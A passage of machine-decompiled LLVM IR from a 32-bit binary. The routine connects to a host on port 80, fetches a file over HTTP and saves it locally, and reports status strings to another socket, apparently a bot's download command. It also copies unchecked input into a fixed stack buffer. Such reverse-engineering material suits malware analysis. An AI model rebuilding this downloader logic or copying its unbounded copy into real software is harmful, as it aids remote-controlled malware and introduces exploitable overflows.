  br i1 %v1_80539fe, label %dec_label_pc_8053f8d, label %dec_label_pc_8053a04

dec_label_pc_8053a04:                             ; preds = %entry
  %v12_80539d3 = ptrtoint i32* %stack_var_-6252 to i32
  %v4_8053a04 = add i32 %arg3, -1
  %v8_8053a04 = icmp eq i32 %arg3, 0
  %v9_8053a04 = sub i32 0, %arg3
  %v10_8053a04 = and i32 %arg3, %v9_8053a04
  %v11_8053a04 = icmp slt i32 %v10_8053a04, 0
  store i1 %v8_8053a04, i1* %cf.global-to-local, align 1
  %v12_8053a04 = icmp eq i32 %v4_8053a04, 0
  %v13_8053a04 = icmp slt i32 %v4_8053a04, 0
  %v3_8053a08 = icmp eq i1 %v13_8053a04, %v11_8053a04
  %v4_8053a08 = icmp eq i1 %v12_8053a04, false
  %v5_8053a08 = and i1 %v4_8053a08, %v3_8053a08
  br i1 %v5_8053a08, label %dec_label_pc_8053a2a, label %dec_label_pc_8053a0a

dec_label_pc_8053a0a:                             ; preds = %dec_label_pc_8053a04
  %v5_8053a0a = icmp ult i32* %stack_var_-6252, inttoptr (i32 4 to i32*)
  store i1 %v5_8053a0a, i1* %cf.global-to-local, align 1
  %v4_8053a18 = call i32 @Send(i32 %arg1, i32 ptrtoint ([40 x i8]* @global_var_806a904.498 to i32))
  store i1 %v5_80539ee, i1* %cf.global-to-local, align 1
  %v2_8053a25 = call i32 @__GI_exit(i32 0)
  %v0_8053a2a.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8053a2a

dec_label_pc_8053a2a:                             ; preds = %dec_label_pc_8053a04, %dec_label_pc_8053a0a
  %v0_8053a2a = phi i32 [ %v0_8053a2a.pre, %dec_label_pc_8053a0a ], [ %v12_80539d3, %dec_label_pc_8053a04 ]
  %v5_8053a2a = icmp ult i32 %v0_8053a2a, 4
  store i1 %v5_8053a2a, i1* %cf.global-to-local, align 1
  %v5_8053a33 = call i32 @socket(i32 2, i32 1, i32 0)
  %v8_8053a3e = icmp ne i32 %v5_8053a33, -1
  store i1 %v8_8053a3e, i1* %cf.global-to-local, align 1
  %v13_8053a3e = icmp eq i32 %v5_8053a33, -1
  %v1_8053a42 = icmp eq i1 %v13_8053a3e, false
  br i1 %v1_8053a42, label %dec_label_pc_8053a64, label %dec_label_pc_8053a44

dec_label_pc_8053a44:                             ; preds = %dec_label_pc_8053a2a
  %v5_8053a44 = icmp ult i32* %stack_var_-6252, inttoptr (i32 4 to i32*)
  store i1 %v5_8053a44, i1* %cf.global-to-local, align 1
  %v4_8053a52 = call i32 @Send(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_80688e8.39 to i32))
  store i1 %v5_80539ee, i1* %cf.global-to-local, align 1
  %v2_8053a5f = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8053a64

dec_label_pc_8053a64:                             ; preds = %dec_label_pc_8053a2a, %dec_label_pc_8053a44
  %v1_8053a67 = add i32 %arg4, 4
  %v5_8053a67 = icmp ugt i32 %arg4, -5
  store i1 %v5_8053a67, i1* %cf.global-to-local, align 1
  %v1_8053a6a = inttoptr i32 %v1_8053a67 to i32*
  %v2_8053a6a = load i32, i32* %v1_8053a6a, align 4
  store i1 false, i1* @df, align 1
  %v4_8053a87 = inttoptr i32 %v2_8053a6a to i8*
  store i32 %v2_8053a6a, i32* @esi, align 4
  %v7_8053a99 = call i32 @_strncmp(i8* %v4_8053a87, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_806890d.40, i32 0, i32 0), i32 7)
  %v8_8053a99 = urem i32 %v7_8053a99, 2
  %v9_8053a99 = icmp eq i32 %v8_8053a99, 0
  %v0_8053a9b = load i1, i1* %cf.global-to-local, align 1
  %v2_8053a9b = or i1 %v0_8053a9b, %v9_8053a99
  %v3_8053a9b = zext i1 %v2_8053a9b to i32
  %v4_8053a9b = load i32, i32* @edx, align 4
  %v5_8053a9b = and i32 %v4_8053a9b, -256
  %v6_8053a9b = or i32 %v3_8053a9b, %v5_8053a9b
  %v7_8053a9b = xor i32 %v6_8053a9b, 1
  store i32 %v7_8053a9b, i32* %edx.global-to-local, align 4
  %v1_8053aa3 = trunc i32 %v7_8053a9b to i8
  %v3_8053aa3 = zext i1 %v0_8053a9b to i8
  %v15_8053aa3 = icmp eq i8 %v1_8053aa3, %v3_8053aa3
  %v1_8053aac = icmp eq i1 %v15_8053aa3, false
  store i1 %v5_8053a67, i1* %cf.global-to-local, align 1
  %v2_8053ad4 = load i32, i32* %v1_8053a6a, align 4
  br i1 %v1_8053aac, label %dec_label_pc_8053ace, label %dec_label_pc_8053aae

dec_label_pc_8053aae:                             ; preds = %dec_label_pc_8053a64
  %v1_8053ab6 = add i32 %v2_8053ad4, 7
  %v0_8053ab9 = load i32, i32* @esp, align 4
  %v5_8053ab9 = icmp ult i32 %v0_8053ab9, 8
  store i1 %v5_8053ab9, i1* %cf.global-to-local, align 1
  %v2_8053abd = ptrtoint i32* %stack_var_-1096 to i32
  store i32 %v2_8053abd, i32* @eax, align 4
  %tmp81 = bitcast i32* %stack_var_-1096 to i8*
  %v5_8053ac4 = call i32 @strcpy(i8* %tmp81, i32 %v1_8053ab6)
  br label %dec_label_pc_8053ae9

dec_label_pc_8053ace:                             ; preds = %dec_label_pc_8053a64
  %v0_8053ad6 = load i32, i32* @esp, align 4
  %v5_8053ad6 = icmp ult i32 %v0_8053ad6, 8
  store i1 %v5_8053ad6, i1* %cf.global-to-local, align 1
  %v2_8053ada = ptrtoint i32* %stack_var_-1096 to i32
  store i32 %v2_8053ada, i32* @eax, align 4
  %tmp82 = bitcast i32* %stack_var_-1096 to i8*
  %v5_8053ae1 = call i32 @strcpy(i8* %tmp82, i32 %v2_8053ad4)
  br label %dec_label_pc_8053ae9

dec_label_pc_8053ae9:                             ; preds = %dec_label_pc_8053aae, %dec_label_pc_8053ace
  %v4_8053b0c.pre-phi = phi i8* [ %tmp81, %dec_label_pc_8053aae ], [ %tmp82, %dec_label_pc_8053ace ]
  %v2_8053af8.pre-phi = phi i32 [ %v2_8053abd, %dec_label_pc_8053aae ], [ %v2_8053ada, %dec_label_pc_8053ace ]
  %storemerge16.in = load i32, i32* @esp, align 4
  %storemerge16 = icmp ugt i32 %storemerge16.in, -17
  store i1 %storemerge16, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8053af5

dec_label_pc_8053af2:                             ; preds = %dec_label_pc_8053b1d
  %v4_8053af2 = add i32 %storemerge8, 1
  br label %dec_label_pc_8053af5

dec_label_pc_8053af5:                             ; preds = %dec_label_pc_8053ae9, %dec_label_pc_8053af2
  %storemerge8 = phi i32 [ %v4_8053af2, %dec_label_pc_8053af2 ], [ 0, %dec_label_pc_8053ae9 ]
  store i32 %storemerge8, i32* @edx, align 4
  store i1 false, i1* @df, align 1
  store i32 %v2_8053af8.pre-phi, i32* @edi, align 4
  %v3_8053b12 = call i32 @_strlen(i8* %v4_8053b0c.pre-phi)
  %v0_8053b19 = load i32, i32* @edx, align 4
  %v7_8053b19 = icmp ult i32 %v0_8053b19, %v3_8053b12
  store i1 %v7_8053b19, i1* %cf.global-to-local, align 1
  %v1_8053b1b = icmp eq i1 %v7_8053b19, false
  br i1 %v1_8053b1b, label %dec_label_pc_8053af5.dec_label_pc_8053b2b_crit_edge, label %dec_label_pc_8053b1d

dec_label_pc_8053af5.dec_label_pc_8053b2b_crit_edge: ; preds = %dec_label_pc_8053af5
  %v0_8053b2e.pre = load i32, i32* @ebp, align 4
  %.pre = add i32 %storemerge8, -1092
  br label %dec_label_pc_8053b2b

dec_label_pc_8053b1d:                             ; preds = %dec_label_pc_8053af5
  %v0_8053b20 = load i32, i32* @ebp, align 4
  %v2_8053b20 = add i32 %storemerge8, -1092
  %v3_8053b20 = add i32 %v0_8053b20, %v2_8053b20
  %v4_8053b20 = inttoptr i32 %v3_8053b20 to i8*
  %v5_8053b20 = load i8, i8* %v4_8053b20, align 1
  %v6_8053b27 = icmp ult i8 %v5_8053b20, 47
  store i1 %v6_8053b27, i1* %cf.global-to-local, align 1
  %v10_8053b27 = icmp eq i8 %v5_8053b20, 47
  %v1_8053b29 = icmp eq i1 %v10_8053b27, false
  br i1 %v1_8053b29, label %dec_label_pc_8053af2, label %dec_label_pc_8053b2b

dec_label_pc_8053b2b:                             ; preds = %dec_label_pc_8053b1d, %dec_label_pc_8053af5.dec_label_pc_8053b2b_crit_edge
  %v2_8053b2e.pre-phi = phi i32 [ %.pre, %dec_label_pc_8053af5.dec_label_pc_8053b2b_crit_edge ], [ %v2_8053b20, %dec_label_pc_8053b1d ]
  %v0_8053b2e = phi i32 [ %v0_8053b2e.pre, %dec_label_pc_8053af5.dec_label_pc_8053b2b_crit_edge ], [ %v0_8053b20, %dec_label_pc_8053b1d ]
  %v3_8053b2e = add i32 %v0_8053b2e, %v2_8053b2e.pre-phi
  %v4_8053b2e = inttoptr i32 %v3_8053b2e to i8*
  store i8 0, i8* %v4_8053b2e, align 1
  store i32 2, i32* %stack_var_-72, align 4
  %v0_8053b3c = load i32, i32* @esp, align 4
  %v5_8053b3c = icmp ult i32 %v0_8053b3c, 12
  store i1 %v5_8053b3c, i1* %cf.global-to-local, align 1
  %v2_8053b41 = call i32 @htons(i32 80)
  store i1 %v5_80539ee, i1* %cf.global-to-local, align 1
  %v2_8053b57 = call i32 @inet_addr(i32 %v2_8053af8.pre-phi)
  %v8_8053b62 = icmp ne i32 %v2_8053b57, -1
  store i1 %v8_8053b62, i1* %cf.global-to-local, align 1
  %v13_8053b62 = icmp eq i32 %v2_8053b57, -1
  %v1_8053b66 = icmp eq i1 %v13_8053b62, false
  br i1 %v1_8053b66, label %dec_label_pc_8053bc2, label %dec_label_pc_8053b68

dec_label_pc_8053b68:                             ; preds = %dec_label_pc_8053b2b
  store i1 %v5_80539ee, i1* %cf.global-to-local, align 1
  %v2_8053b72 = call i32 @__GI_gethostbyname(i32 %v2_8053af8.pre-phi)
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8053b7d = icmp eq i32 %v2_8053b72, 0
  %v1_8053b81 = icmp eq i1 %v4_8053b7d, false
  br i1 %v1_8053b81, label %dec_label_pc_8053ba3, label %dec_label_pc_8053b83

dec_label_pc_8053b83:                             ; preds = %dec_label_pc_8053b68
  %v5_8053b83 = icmp ult i32* %stack_var_-6252, inttoptr (i32 4 to i32*)
  store i1 %v5_8053b83, i1* %cf.global-to-local, align 1
  %v4_8053b91 = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_8068918.41 to i32))
  store i1 %v5_80539ee, i1* %cf.global-to-local, align 1
  %v2_8053b9e = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8053ba3

dec_label_pc_8053ba3:                             ; preds = %dec_label_pc_8053b68, %dec_label_pc_8053b83
  %v1_8053ba6 = add i32 %v2_8053b72, 12
  %v2_8053ba6 = inttoptr i32 %v1_8053ba6 to i32*
  %v3_8053ba6 = load i32, i32* %v2_8053ba6, align 4
  %v1_8053bae = add i32 %v2_8053b72, 16
  %v2_8053bae = inttoptr i32 %v1_8053bae to i32*
  %v3_8053bae = load i32, i32* %v2_8053bae, align 4
  %v1_8053bb1 = inttoptr i32 %v3_8053bae to i32*
  %v2_8053bb1 = load i32, i32* %v1_8053bb1, align 4
  store i32 %v2_8053bb1, i32* %edx.global-to-local, align 4
  %v5_8053bb6 = icmp eq i32* %stack_var_-72, inttoptr (i32 -4 to i32*)
  store i1 %v5_8053bb6, i1* %cf.global-to-local, align 1
  %v15_8053bb6 = ptrtoint i32* %stack_var_-68 to i32
  %tmp83 = bitcast i32* %stack_var_-68 to i8*
  store i32 %v15_8053bb6, i32* @edi, align 4
  %v1_8053bbb = inttoptr i32 %v2_8053bb1 to i8*
  store i32 %v2_8053bb1, i32* @esi, align 4
  store i1 false, i1* @df, align 1
  %v7_8053bbe = call i8* @_memcpy(i8* %tmp83, i8* %v1_8053bbb, i32 %v3_8053ba6)
  br label %dec_label_pc_8053bc8

dec_label_pc_8053bc2:                             ; preds = %dec_label_pc_8053b2b
  store i32 %v2_8053b57, i32* %stack_var_-68, align 4
  br label %dec_label_pc_8053bc8

dec_label_pc_8053bc8:                             ; preds = %dec_label_pc_8053ba3, %dec_label_pc_8053bc2
  %v2_8053bcf.pre-phi = ptrtoint i32* %stack_var_-72 to i32
  %v5_8053bd2 = icmp ugt i32* %stack_var_-72, inttoptr (i32 -9 to i32*)
  store i1 %v5_8053bd2, i1* %cf.global-to-local, align 1
  %tmp84 = bitcast i32* %stack_var_-64 to i8*
  %v6_8053bd6 = call i32 @__GI_memset(i8* %tmp84, i32 0, i32 8)
  %v5_8053be1 = icmp ult i32* %stack_var_-6252, inttoptr (i32 4 to i32*)
  store i1 %v5_8053be1, i1* %cf.global-to-local, align 1
  %v5_8053bea = call i32 @connect(i32 %v5_8053a33, i32 %v2_8053bcf.pre-phi, i32 16)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8053bf2 = icmp eq i32 %v5_8053bea, 0
  br i1 %v1_8053bf2, label %dec_label_pc_8053bc8.dec_label_pc_8053c16_crit_edge, label %dec_label_pc_8053bf6

dec_label_pc_8053bc8.dec_label_pc_8053c16_crit_edge: ; preds = %dec_label_pc_8053bc8
  br label %dec_label_pc_8053c16

dec_label_pc_8053bf6:                             ; preds = %dec_label_pc_8053bc8
  store i1 %v5_8053be1, i1* %cf.global-to-local, align 1
  %v4_8053c04 = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_8068940.42 to i32))
  store i1 %v5_80539ee, i1* %cf.global-to-local, align 1
  %v2_8053c11 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8053c16

dec_label_pc_8053c16:                             ; preds = %dec_label_pc_8053bc8.dec_label_pc_8053c16_crit_edge, %dec_label_pc_8053bf6
  %v2_8053c21 = add i32 %storemerge8, %v2_8053af8.pre-phi
  %v7_8053c21 = icmp ult i32 %v2_8053c21, %v2_8053af8.pre-phi
  store i1 %v7_8053c21, i1* %cf.global-to-local, align 1
  %v1_8053c23 = add i32 %v2_8053c21, 1
  store i32 %v1_8053c23, i32* %edx.global-to-local, align 4
  %v4_8053c36 = call i32 @Send(i32 %v5_8053a33, i32 ptrtoint ([277 x i8]* @global_var_806a92c.499 to i32))
  store i1 %v5_8053be1, i1* %cf.global-to-local, align 1
  %v4_8053c4c = call i32 @Send(i32 %arg1, i32 ptrtoint ([28 x i8]* @global_var_8068a7c.44 to i32))
  %v1_8053c57 = add i32 %arg4, 8
  %v5_8053c57 = icmp ugt i32 %arg4, -9
  %v1_8053c5a = inttoptr i32 %v1_8053c57 to i32*
  %v2_8053c5a = load i32, i32* %v1_8053c5a, align 4
  store i32 %v2_8053c5a, i32* @eax, align 4
  store i1 %v5_80539d9, i1* %cf.global-to-local, align 1
  %v4_8053c65 = call i32 @__GI_fopen(i32 %v2_8053c5a, i32 ptrtoint ([3 x i8]* @global_var_8068a98.45 to i32))
  %v0_8053c6a = load i32, i32* @esp, align 4
  %v2_8053c6a = icmp ugt i32 %v0_8053c6a, -17
  store i1 %v2_8053c6a, i1* %cf.global-to-local, align 1
  %v2_8053c77 = ptrtoint i32* %stack_var_-5192 to i32
  %v6_8053c81127 = call i32 @recv(i32 %v5_8053a33, i32 %v2_8053c77, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp85129 = icmp slt i32 %v6_8053c81127, 1
  br i1 %tmp85129, label %dec_label_pc_8053dad.loopexit17, label %dec_label_pc_8053c96

dec_label_pc_8053c70.loopexit:                    ; preds = %dec_label_pc_8053d99
  %v6_8053c81 = call i32 @recv(i32 %v5_8053a33, i32 %v2_8053c77, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp85 = icmp slt i32 %v6_8053c81, 1
  br i1 %tmp85, label %dec_label_pc_8053dad.loopexit17, label %dec_label_pc_8053c96

dec_label_pc_8053c96:                             ; preds = %dec_label_pc_8053c16, %dec_label_pc_8053c70.loopexit
  %v6_8053c81130 = phi i32 [ %v6_8053c81, %dec_label_pc_8053c70.loopexit ], [ %v6_8053c81127, %dec_label_pc_8053c16 ]
  %v4_8053c96 = add i32 %v6_8053c81130, -4095
  %v8_8053c96 = icmp ult i32 %v6_8053c81130, 4095
  %v9_8053c96 = sub i32 4094, %v6_8053c81130
  %v10_8053c96 = and i32 %v9_8053c96, %v6_8053c81130
  %v11_8053c96 = icmp slt i32 %v10_8053c96, 0
  store i1 %v8_8053c96, i1* %cf.global-to-local, align 1
  %v12_8053c96 = icmp eq i32 %v4_8053c96, 0
  %v13_8053c96 = icmp slt i32 %v4_8053c96, 0
  %v3_8053c9d = icmp eq i1 %v13_8053c96, %v11_8053c96
  %v4_8053c9d = icmp eq i1 %v12_8053c96, false
  %v5_8053c9d = and i1 %v4_8053c9d, %v3_8053c9d
  br i1 %v5_8053c9d, label %dec_label_pc_8053cb6.lr.ph, label %dec_label_pc_8053c9f

dec_label_pc_8053c9f:                             ; preds = %dec_label_pc_8053c96
  %v0_8053ca2 = load i32, i32* @ebp, align 4
  %v2_8053ca2 = add i32 %v6_8053c81130, -5188
  %v3_8053ca2 = add i32 %v2_8053ca2, %v0_8053ca2
  %v4_8053ca2 = inttoptr i32 %v3_8053ca2 to i8*
  store i8 0, i8* %v4_8053ca2, align 1
  br label %dec_label_pc_8053cb6.lr.ph

dec_label_pc_8053cb6.lr.ph:                       ; preds = %dec_label_pc_8053c9f, %dec_label_pc_8053c96
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8053cb6

dec_label_pc_8053cb6:                             ; preds = %dec_label_pc_8053cb6.lr.ph, %dec_label_pc_8053d99
  %storemerge7126 = phi i32 [ 0, %dec_label_pc_8053cb6.lr.ph ], [ %v4_8053d99, %dec_label_pc_8053d99 ]
  store i32 %storemerge7126, i32* %edx.global-to-local, align 4
  %v2_8053cc1 = add i32 %storemerge7126, %v2_8053c77
  %v7_8053cc1 = icmp ult i32 %v2_8053cc1, %v2_8053c77
  store i1 %v7_8053cc1, i1* %cf.global-to-local, align 1
  store i1 false, i1* @df, align 1
  %v4_8053cde = inttoptr i32 %v2_8053cc1 to i8*
  store i32 %v2_8053cc1, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_8068a9b.46 to i32), i32* @edi, align 4
  %v7_8053cf0 = call i32 @_strncmp(i8* %v4_8053cde, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8068a9b.46, i32 0, i32 0), i32 4)
  %v8_8053cf0 = urem i32 %v7_8053cf0, 2
  %v9_8053cf0 = icmp eq i32 %v8_8053cf0, 0
  %v0_8053cf2 = load i1, i1* %cf.global-to-local, align 1
  %v2_8053cf2 = or i1 %v0_8053cf2, %v9_8053cf0
  %v3_8053cf2 = zext i1 %v2_8053cf2 to i32
  %v4_8053cf2 = load i32, i32* %edx.global-to-local, align 4
  %v5_8053cf2 = and i32 %v4_8053cf2, -256
  %v6_8053cf2 = or i32 %v3_8053cf2, %v5_8053cf2
  %v7_8053cf2 = xor i32 %v6_8053cf2, 1
  store i32 %v7_8053cf2, i32* @edx, align 4
  %v3_8053cf8 = and i32 %v7_8053cf0, -256
  %v1_8053cfa = trunc i32 %v7_8053cf2 to i8
  %v3_8053cfa = zext i1 %v0_8053cf2 to i8
  %v4_8053cfa = sub nsw i8 %v1_8053cfa, %v3_8053cfa
  %v15_8053cfa = icmp eq i8 %v4_8053cfa, 0
  %v20_8053cfa = zext i8 %v4_8053cfa to i32
  %v23_8053cfa = or i32 %v20_8053cfa, %v3_8053cf8
  store i32 %v23_8053cfa, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8053d03 = icmp eq i1 %v15_8053cfa, false
  br i1 %v1_8053d03, label %dec_label_pc_8053d99, label %dec_label_pc_8053d09

dec_label_pc_8053d09:                             ; preds = %dec_label_pc_8053cb6
  %v4_8053d09 = add i32 %storemerge7126, 4
  %v1_8053d18 = add i32 %v4_8053c65, 52
  %v2_8053d18 = inttoptr i32 %v1_8053d18 to i32*
  %v1_8053d22 = add i32 %v4_8053c65, 16
  %v2_8053d22 = inttoptr i32 %v1_8053d22 to i32*
  %v1_8053d28 = add i32 %v4_8053c65, 28
  %v2_8053d28 = inttoptr i32 %v1_8053d28 to i32*
  %v10_8053d8e110 = icmp ult i32 %v4_8053d09, %v6_8053c81130
  store i1 %v10_8053d8e110, i1* %cf.global-to-local, align 1
  %v5_8053d91116 = icmp slt i32 %v4_8053d09, %v6_8053c81130
  br i1 %v5_8053d91116, label %dec_label_pc_8053d0f, label %dec_label_pc_8053dad

dec_label_pc_8053d0f:                             ; preds = %dec_label_pc_8053d09, %dec_label_pc_8053d88
  %storemerge13.in117 = phi i32 [ %v4_8053d88, %dec_label_pc_8053d88 ], [ %v4_8053d09, %dec_label_pc_8053d09 ]
  %v3_8053d18 = load i32, i32* %v2_8053d18, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8053d1b = icmp eq i32 %v3_8053d18, 0
  br i1 %v1_8053d1b, label %dec_label_pc_8053d6a, label %dec_label_pc_8053d1f

dec_label_pc_8053d1f:                             ; preds = %dec_label_pc_8053d0f
  %v3_8053d22 = load i32, i32* %v2_8053d22, align 4
  store i32 %v3_8053d22, i32* @edx, align 4
  %v3_8053d28 = load i32, i32* %v2_8053d28, align 4
  %v7_8053d2b = icmp ult i32 %v3_8053d22, %v3_8053d28
  store i1 %v7_8053d2b, i1* %cf.global-to-local, align 1
  %v1_8053d2d = icmp eq i1 %v7_8053d2b, false
  br i1 %v1_8053d2d, label %dec_label_pc_8053d4a, label %dec_label_pc_8053d2f

dec_label_pc_8053d2f:                             ; preds = %dec_label_pc_8053d1f
  %v3_8053d32 = load i32, i32* %v2_8053d22, align 4
  store i32 %v3_8053d32, i32* %edx.global-to-local, align 4
  %v0_8053d38 = load i32, i32* @ebp, align 4
  %v2_8053d38 = add i32 %storemerge13.in117, -5188
  %v3_8053d38 = add i32 %v2_8053d38, %v0_8053d38
  %v4_8053d38 = inttoptr i32 %v3_8053d38 to i8*
  %v5_8053d38 = load i8, i8* %v4_8053d38, align 1
  %v3_8053d3f = inttoptr i32 %v3_8053d32 to i8*
  store i8 %v5_8053d38, i8* %v3_8053d3f, align 1
  %v0_8053d41 = load i32, i32* %edx.global-to-local, align 4
  %v1_8053d41 = add i32 %v0_8053d41, 1
  store i32 %v1_8053d41, i32* @edx, align 4
  store i32 %v1_8053d41, i32* %v2_8053d22, align 4
  br label %dec_label_pc_8053d88

dec_label_pc_8053d4a:                             ; preds = %dec_label_pc_8053d1f
  %v0_8053d4d = load i32, i32* @ebp, align 4
  %v2_8053d4d = add i32 %storemerge13.in117, -5188
  %v3_8053d4d = add i32 %v2_8053d4d, %v0_8053d4d
  %v4_8053d4d = inttoptr i32 %v3_8053d4d to i8*
  %v5_8053d4d = load i8, i8* %v4_8053d4d, align 1
  %v0_8053d59 = load i32, i32* @esp, align 4
  %v5_8053d59 = icmp ult i32 %v0_8053d59, 8
  store i1 %v5_8053d59, i1* %cf.global-to-local, align 1
  %v5_8053d60 = call i32 @putc_unlocked(i8 %v5_8053d4d, i32 %v4_8053c65)
  %v0_8053d65 = load i32, i32* @esp, align 4
  %v2_8053d65 = icmp ugt i32 %v0_8053d65, -17
  store i1 %v2_8053d65, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8053d88

dec_label_pc_8053d6a:                             ; preds = %dec_label_pc_8053d0f
  %v0_8053d6d = load i32, i32* @ebp, align 4
  %v2_8053d6d = add i32 %storemerge13.in117, -5188
  %v3_8053d6d = add i32 %v2_8053d6d, %v0_8053d6d
  %v4_8053d6d = inttoptr i32 %v3_8053d6d to i8*
  %v5_8053d6d = load i8, i8* %v4_8053d6d, align 1
  %v0_8053d79 = load i32, i32* @esp, align 4
  %v5_8053d79 = icmp ult i32 %v0_8053d79, 8
  store i1 %v5_8053d79, i1* %cf.global-to-local, align 1
  %v5_8053d80 = call i32 @__GI_fputc(i8 %v5_8053d6d, i32 %v4_8053c65)
  %v0_8053d85 = load i32, i32* @esp, align 4
  %v2_8053d85 = icmp ugt i32 %v0_8053d85, -17
  store i1 %v2_8053d85, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8053d88

dec_label_pc_8053d88:                             ; preds = %dec_label_pc_8053d4a, %dec_label_pc_8053d2f, %dec_label_pc_8053d6a
  %v4_8053d88 = add i32 %storemerge13.in117, 1
  %v10_8053d8e = icmp ult i32 %v4_8053d88, %v6_8053c81130
  store i1 %v10_8053d8e, i1* %cf.global-to-local, align 1
  %exitcond135 = icmp eq i32 %v4_8053d88, %v6_8053c81130
  br i1 %exitcond135, label %dec_label_pc_8053dad, label %dec_label_pc_8053d0f

dec_label_pc_8053d99:                             ; preds = %dec_label_pc_8053cb6
  %v4_8053d99 = add nuw nsw i32 %storemerge7126, 1
  %v10_8053d9f = icmp ult i32 %v4_8053d99, %v6_8053c81130
  store i1 %v10_8053d9f, i1* %cf.global-to-local, align 1
  %v5_8053da2 = icmp slt i32 %v4_8053d99, %v6_8053c81130
  br i1 %v5_8053da2, label %dec_label_pc_8053cb6, label %dec_label_pc_8053c70.loopexit

dec_label_pc_8053dad.loopexit17:                  ; preds = %dec_label_pc_8053c70.loopexit, %dec_label_pc_8053c16
  %.pre31 = add i32 %v4_8053c65, 52
  %.pre32 = inttoptr i32 %.pre31 to i32*
  %.pre34 = add i32 %v4_8053c65, 16
  %.pre35 = inttoptr i32 %.pre34 to i32*
  %.pre36 = add i32 %v4_8053c65, 28
  %.pre37 = inttoptr i32 %.pre36 to i32*
  br label %dec_label_pc_8053dad

dec_label_pc_8053dad:                             ; preds = %dec_label_pc_8053d09, %dec_label_pc_8053d88, %dec_label_pc_8053dad.loopexit17
  %v2_8053e25.pre-phi = phi i32* [ %.pre37, %dec_label_pc_8053dad.loopexit17 ], [ %v2_8053d28, %dec_label_pc_8053d88 ], [ %v2_8053d28, %dec_label_pc_8053d09 ]
  %v2_8053e1f.pre-phi = phi i32* [ %.pre35, %dec_label_pc_8053dad.loopexit17 ], [ %v2_8053d22, %dec_label_pc_8053d88 ], [ %v2_8053d22, %dec_label_pc_8053d09 ]
  %v2_8053e15.pre-phi = phi i32* [ %.pre32, %dec_label_pc_8053dad.loopexit17 ], [ %v2_8053d18, %dec_label_pc_8053d88 ], [ %v2_8053d18, %dec_label_pc_8053d09 ]
  store i1 %v5_8053c57, i1* %cf.global-to-local, align 1
  %v4_8053dc1 = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_806aa44.500 to i32))
  %v0_8053dc6 = load i32, i32* @esp, align 4
  %v2_8053dc6 = icmp ugt i32 %v0_8053dc6, -17
  store i1 %v2_8053dc6, i1* %cf.global-to-local, align 1
  %v6_8053dda105 = call i32 @recv(i32 %v5_8053a33, i32 %v2_8053c77, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp86107 = icmp slt i32 %v6_8053dda105, 1
  br i1 %tmp86107, label %dec_label_pc_8053e99, label %dec_label_pc_8053def

dec_label_pc_8053dc9.loopexit:                    ; preds = %dec_label_pc_8053e85
  %v6_8053dda = call i32 @recv(i32 %v5_8053a33, i32 %v2_8053c77, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp86 = icmp slt i32 %v6_8053dda, 1
  br i1 %tmp86, label %dec_label_pc_8053e99, label %dec_label_pc_8053def

dec_label_pc_8053def:                             ; preds = %dec_label_pc_8053dad, %dec_label_pc_8053dc9.loopexit
  %v6_8053dda108 = phi i32 [ %v6_8053dda, %dec_label_pc_8053dc9.loopexit ], [ %v6_8053dda105, %dec_label_pc_8053dad ]
  %v4_8053def = add i32 %v6_8053dda108, -4095
  %v8_8053def = icmp ult i32 %v6_8053dda108, 4095
  %v9_8053def = sub i32 4094, %v6_8053dda108
  %v10_8053def = and i32 %v9_8053def, %v6_8053dda108
  %v11_8053def = icmp slt i32 %v10_8053def, 0
  store i1 %v8_8053def, i1* %cf.global-to-local, align 1
  %v12_8053def = icmp eq i32 %v4_8053def, 0
  %v13_8053def = icmp slt i32 %v4_8053def, 0
  %v3_8053df6 = icmp eq i1 %v13_8053def, %v11_8053def
  %v4_8053df6 = icmp eq i1 %v12_8053def, false
  %v5_8053df6 = and i1 %v4_8053df6, %v3_8053df6
  br i1 %v5_8053df6, label %dec_label_pc_8053e0c.lr.ph, label %dec_label_pc_8053df8

dec_label_pc_8053df8:                             ; preds = %dec_label_pc_8053def
  %v0_8053dfb = load i32, i32* @ebp, align 4
  %v2_8053dfb = add i32 %v6_8053dda108, -5188
  %v3_8053dfb = add i32 %v2_8053dfb, %v0_8053dfb
  %v4_8053dfb = inttoptr i32 %v3_8053dfb to i8*
  store i8 0, i8* %v4_8053dfb, align 1
  br label %dec_label_pc_8053e0c.lr.ph

dec_label_pc_8053e0c.lr.ph:                       ; preds = %dec_label_pc_8053df8, %dec_label_pc_8053def
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8053e0c

dec_label_pc_8053e0c:                             ; preds = %dec_label_pc_8053e85, %dec_label_pc_8053e0c.lr.ph
  %storemerge5104 = phi i32 [ 0, %dec_label_pc_8053e0c.lr.ph ], [ %v4_8053e85, %dec_label_pc_8053e85 ]
  %v3_8053e15 = load i32, i32* %v2_8053e15.pre-phi, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8053e18 = icmp eq i32 %v3_8053e15, 0
  br i1 %v1_8053e18, label %dec_label_pc_8053e67, label %dec_label_pc_8053e1c

dec_label_pc_8053e1c:                             ; preds = %dec_label_pc_8053e0c
  %v3_8053e1f = load i32, i32* %v2_8053e1f.pre-phi, align 4
